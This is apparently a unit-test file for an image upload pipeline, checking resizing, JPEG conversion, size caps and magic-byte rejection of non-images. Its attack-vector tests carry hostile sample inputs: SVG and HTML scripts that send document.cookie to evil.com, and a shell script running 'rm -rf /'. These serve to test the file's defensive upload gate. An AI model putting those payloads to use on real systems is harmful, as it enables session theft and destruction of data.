import { describe, expect, it } from "vitest";
import sharp from "sharp";

import {
  ACCEPTED_MIME_TYPES,
  ImageTooLargeError,
  InvalidImageError,
  MAX_UPLOAD_BYTES,
  MAX_DIMENSION_PX,
  THUMB_DIMENSION_PX,
  processImage,
  hasValidImageSignature,
} from "./images";

/**
 * `images.ts` is the sharp pipeline for daily-report photos. We
 * unit-test the pure behaviour (resize, format, error mapping) with
 * buffers generated on the fly — no real files needed.
 *
 * Key invariants:
 *  - Garbage input throws InvalidImageError so the API responds 422
 *    instead of crashing the route handler.
 *  - An over-size payload is rejected *before* sharp is invoked.
 *  - Both variants always come back as JPEG with the longer edge capped
 *    at the configured limit.
 *  - Small images are NEVER upscaled (`withoutEnlargement: true`).
 */

async function makeJpeg(width: number, height: number): Promise<Buffer> {
  return sharp({
    create: {
      width,
      height,
      channels: 3,
      background: { r: 200, g: 100, b: 50 },
    },
  })
    .jpeg()
    .toBuffer();
}

describe("processImage — happy path", () => {
  it("resizes a 3000×2000 photo to fit within 1920 px and emits a thumb", async () => {
    const input = await makeJpeg(3000, 2000);
    const out = await processImage(input);

    expect(Math.max(out.width, out.height)).toBeLessThanOrEqual(MAX_DIMENSION_PX);
    expect(out.width).toBe(MAX_DIMENSION_PX);
    expect(out.height).toBe(Math.round((2000 / 3000) * MAX_DIMENSION_PX));

    const thumbMeta = await sharp(out.thumb).metadata();
    expect(thumbMeta.format).toBe("jpeg");
    expect(Math.max(thumbMeta.width ?? 0, thumbMeta.height ?? 0)).toBeLessThanOrEqual(
      THUMB_DIMENSION_PX,
    );

    const mainMeta = await sharp(out.main).metadata();
    expect(mainMeta.format).toBe("jpeg");
  });

  it("does not upscale images already smaller than the limits", async () => {
    const input = await makeJpeg(800, 600);
    const out = await processImage(input);
    expect(out.width).toBe(800);
    expect(out.height).toBe(600);

    const thumbMeta = await sharp(out.thumb).metadata();
    // Thumb resize is capped at THUMB_DIMENSION_PX and likewise honours
    // `withoutEnlargement` so a 800-wide source produces a 400-wide thumb
    // (the longer edge), not an upscaled 800 px image.
    expect(Math.max(thumbMeta.width ?? 0, thumbMeta.height ?? 0)).toBeLessThanOrEqual(
      THUMB_DIMENSION_PX,
    );
  });

  it("accepts the MIME types the API advertises", () => {
    expect(ACCEPTED_MIME_TYPES.has("image/jpeg")).toBe(true);
    expect(ACCEPTED_MIME_TYPES.has("image/png")).toBe(true);
    expect(ACCEPTED_MIME_TYPES.has("image/webp")).toBe(true);
    expect(ACCEPTED_MIME_TYPES.has("image/heic")).toBe(true);
  });
});

describe("processImage — failures", () => {
  it("throws InvalidImageError on an empty buffer", async () => {
    await expect(processImage(Buffer.alloc(0))).rejects.toBeInstanceOf(
      InvalidImageError,
    );
  });

  it("throws InvalidImageError on garbage bytes", async () => {
    const garbage = Buffer.from("this is definitely not an image\n".repeat(50));
    await expect(processImage(garbage)).rejects.toBeInstanceOf(InvalidImageError);
  });

  it("throws ImageTooLargeError on a payload bigger than MAX_UPLOAD_BYTES", async () => {
    // We don't need a real image here — the size check runs first.
    const oversize = Buffer.alloc(MAX_UPLOAD_BYTES + 1);
    await expect(processImage(oversize)).rejects.toBeInstanceOf(
      ImageTooLargeError,
    );
  });

  it("throws ImageTooLargeError on a decoded image past MAX_PIXELS", async () => {
    // 4000×3000 = 12 MP, nad 8 MP cap. Sharp PNG enkodér produkuje
    // malý soubor (jednolitá barva) takže byte-size guard nezáleží
    // — kontrolujeme metadata pixel-count check.
    const tooManyPixels = await sharp({
      create: {
        width: 4000,
        height: 3000,
        channels: 3,
        background: { r: 0, g: 0, b: 0 },
      },
    })
      .png({ compressionLevel: 9 })
      .toBuffer();
    expect(tooManyPixels.length).toBeLessThan(MAX_UPLOAD_BYTES);
    await expect(processImage(tooManyPixels)).rejects.toBeInstanceOf(
      ImageTooLargeError,
    );
  });
});

// ---------------------------------------------------------------------------
// hasValidImageSignature — magic byte pre-flight check
// ---------------------------------------------------------------------------

describe("hasValidImageSignature", () => {
  it("recognises JPEG (FF D8 FF)", async () => {
    const jpeg = await makeJpeg(100, 100);
    expect(hasValidImageSignature(jpeg)).toBe(true);
  });

  it("recognises PNG (89 50 4E 47 ...)", async () => {
    const png = await sharp({
      create: { width: 100, height: 100, channels: 3, background: { r: 0, g: 0, b: 0 } },
    }).png().toBuffer();
    expect(hasValidImageSignature(png)).toBe(true);
  });

  it("recognises WebP (RIFF....WEBP)", async () => {
    const webp = await sharp({
      create: { width: 100, height: 100, channels: 3, background: { r: 0, g: 0, b: 0 } },
    }).webp().toBuffer();
    expect(hasValidImageSignature(webp)).toBe(true);
  });

  it("rejects an EXE (PE header MZ)", () => {
    // Minimal PE signature: MZ at byte 0-1
    const exe = Buffer.alloc(64);
    exe[0] = 0x4D; // M
    exe[1] = 0x5A; // Z
    expect(hasValidImageSignature(exe)).toBe(false);
  });

  it("rejects a PDF (%PDF-)", () => {
    const pdf = Buffer.from("%PDF-1.7 fake document content that keeps going...");
    expect(hasValidImageSignature(pdf)).toBe(false);
  });

  it("rejects an SVG (XML text)", () => {
    const svg = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    );
    expect(hasValidImageSignature(svg)).toBe(false);
  });

  it("rejects HTML", () => {
    const html = Buffer.from(
      "<!DOCTYPE html><html><body><script>alert(1)</script></body></html>",
    );
    expect(hasValidImageSignature(html)).toBe(false);
  });

  it("rejects a buffer too short for any signature", () => {
    expect(hasValidImageSignature(Buffer.from([0xFF, 0xD8]))).toBe(false);
    expect(hasValidImageSignature(Buffer.alloc(11))).toBe(false);
  });

  it("rejects garbage / random bytes", () => {
    const garbage = Buffer.from("this is definitely not an image\n".repeat(5));
    expect(hasValidImageSignature(garbage)).toBe(false);
  });

  it("rejects an ELF binary (Linux executable)", () => {
    // ELF magic: 7F 45 4C 46
    const elf = Buffer.alloc(64);
    elf[0] = 0x7F;
    elf[1] = 0x45; // E
    elf[2] = 0x4C; // L
    elf[3] = 0x46; // F
    expect(hasValidImageSignature(elf)).toBe(false);
  });

  it("rejects a ZIP archive", () => {
    // ZIP magic: PK (50 4B 03 04)
    const zip = Buffer.alloc(64);
    zip[0] = 0x50; // P
    zip[1] = 0x4B; // K
    zip[2] = 0x03;
    zip[3] = 0x04;
    expect(hasValidImageSignature(zip)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// processImage — additional format happy paths
// ---------------------------------------------------------------------------

describe("processImage — PNG and WebP inputs", () => {
  it("accepts and converts a valid PNG to JPEG", async () => {
    const png = await sharp({
      create: { width: 640, height: 480, channels: 3, background: { r: 50, g: 100, b: 200 } },
    }).png().toBuffer();
    const out = await processImage(png);
    expect(out.width).toBe(640);
    expect(out.height).toBe(480);
    const mainMeta = await sharp(out.main).metadata();
    expect(mainMeta.format).toBe("jpeg");
  });

  it("accepts and converts a valid WebP to JPEG", async () => {
    const webp = await sharp({
      create: { width: 640, height: 480, channels: 3, background: { r: 50, g: 100, b: 200 } },
    }).webp().toBuffer();
    const out = await processImage(webp);
    expect(out.width).toBe(640);
    expect(out.height).toBe(480);
    const mainMeta = await sharp(out.main).metadata();
    expect(mainMeta.format).toBe("jpeg");
  });
});

// ---------------------------------------------------------------------------
// processImage — attack-vector rejections (magic byte gate)
// ---------------------------------------------------------------------------

describe("processImage — attack vectors (magic byte gate)", () => {
  it("rejects a Windows EXE disguised with .jpg extension", async () => {
    // Simulates: `malware.exe` renamed to `malware.jpg` with forged
    // Content-Type. The PE header (MZ) must NOT pass.
    const exe = Buffer.alloc(256);
    exe[0] = 0x4D; // M
    exe[1] = 0x5A; // Z
    await expect(processImage(exe)).rejects.toBeInstanceOf(InvalidImageError);
    await expect(processImage(exe)).rejects.toThrow(/hlavičku obrázku/);
  });

  it("rejects an SVG with embedded JavaScript", async () => {
    const svg = Buffer.from(
      `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">` +
      `<script type="text/javascript">document.location='https://evil.com/?c='+document.cookie</script>` +
      `</svg>`,
    );
    await expect(processImage(svg)).rejects.toBeInstanceOf(InvalidImageError);
  });

  it("rejects an HTML file with a script tag", async () => {
    const html = Buffer.from(
      `<!DOCTYPE html><html><head><title>Phishing</title></head>` +
      `<body><script>fetch('https://evil.com',{method:'POST',body:document.cookie})</script></body></html>`,
    );
    await expect(processImage(html)).rejects.toBeInstanceOf(InvalidImageError);
  });

  it("rejects a PDF document", async () => {
    const pdf = Buffer.from(
      "%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF",
    );
    await expect(processImage(pdf)).rejects.toBeInstanceOf(InvalidImageError);
  });

  it("rejects a shell script", async () => {
    const sh = Buffer.from("#!/bin/bash\nrm -rf /\n".padEnd(64, " "));
    await expect(processImage(sh)).rejects.toBeInstanceOf(InvalidImageError);
  });
});

